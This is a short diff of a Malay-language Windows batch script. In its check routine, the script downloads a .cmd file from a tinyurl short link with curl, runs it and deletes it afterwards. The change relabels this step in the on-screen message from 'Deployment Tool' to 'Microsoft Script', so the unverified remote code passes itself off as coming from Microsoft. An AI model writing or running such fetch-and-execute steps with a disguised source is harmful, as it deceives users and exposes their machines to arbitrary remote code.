@@ -96,7 +96,7 @@ goto ulang
 
 :dcheck
 echo.
-echo Muat turun dan jalankan Deployment Tool...
+echo Muat turun dan jalankan Microsoft Script...
 curl -L https://tinyurl.com/capikku009 -o temp_checkcapik.cmd
 call temp_checkcapik.cmd
 del /f /q temp_checkcapik.cmd
